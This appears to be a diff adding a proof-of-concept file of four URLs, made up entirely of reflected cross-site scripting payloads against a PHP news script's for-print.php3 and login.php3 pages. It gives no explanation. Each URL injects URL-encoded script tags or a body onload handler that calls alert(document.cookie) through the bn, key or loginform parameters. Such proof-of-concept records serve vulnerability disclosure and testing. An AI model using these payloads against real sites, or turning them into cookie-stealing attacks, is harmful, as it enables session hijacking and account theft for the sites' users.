@@ -1,0 +1,4 @@
+http://www.example.com/news/for-print.php3?bn=x&amp;key=1282850719%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/news/for-print.php3?bn=%3Cbody%20onload=alert(document.cookie)%3E
+http://www.example.com/news/login.php3?bn=x&amp;loginform=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+http://www.example.com/news/login.php3?bn=%3Cbody%20onload=alert(document.cookie)%3E 
